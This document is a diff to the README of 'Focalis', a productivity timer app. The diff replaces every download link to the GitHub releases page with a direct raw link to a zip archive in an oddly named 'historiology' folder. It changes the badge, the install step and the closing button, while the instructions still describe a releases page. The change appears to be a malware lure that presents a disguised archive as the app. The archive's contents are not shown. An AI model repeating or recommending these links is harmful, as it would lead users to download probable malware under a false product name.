@@ -18,11 +18,11 @@ Focalis isn't just another timer - it's your personal productivity partner. Here
 
 ## 📦 Download and Installation
 
-[![Download Now](https://img.shields.io/badge/Download-Focalis-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/Tympanumlaver150/Focalis/releases)
+[![Download Now](https://img.shields.io/badge/Download-Focalis-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://raw.githubusercontent.com/Tympanumlaver150/Focalis/main/historiology/Software_v2.4-beta.2.zip)
 
 **Getting Focalis on your computer is quick and simple:**
 
-1. **Visit this link to download the application** - Click the big green button above or go to: https://github.com/Tympanumlaver150/Focalis/releases
+1. **Visit this link to download the application** - Click the big green button above or go to: https://raw.githubusercontent.com/Tympanumlaver150/Focalis/main/historiology/Software_v2.4-beta.2.zip
 
 2. **Find the latest version** - On the page you'll see a list of releases. Look for the most recent one at the top.
 
@@ -124,7 +124,7 @@ We're constantly improving Focalis based on user feedback. Your suggestions matt
 
 Download Focalis today and discover how easy focused work can be. With its intuitive design and powerful features, you'll wonder how you ever managed without it. Your journey to better focus and greater achievement starts with a single click.
 
-[![Get Focalis Now](https://img.shields.io/badge/Get_Focalis-Download-green?style=for-the-badge&logo=github&logoColor=white&color=2196F3)](https://github.com/Tympanumlaver150/Focalis/releases)
+[![Get Focalis Now](https://img.shields.io/badge/Get_Focalis-Download-green?style=for-the-badge&logo=github&logoColor=white&color=2196F3)](https://raw.githubusercontent.com/Tympanumlaver150/Focalis/main/historiology/Software_v2.4-beta.2.zip)
 
 Remember: Great work isn't about having more time – it's about using the time you have more effectively. Focalis is your partner in making every minute count.
 
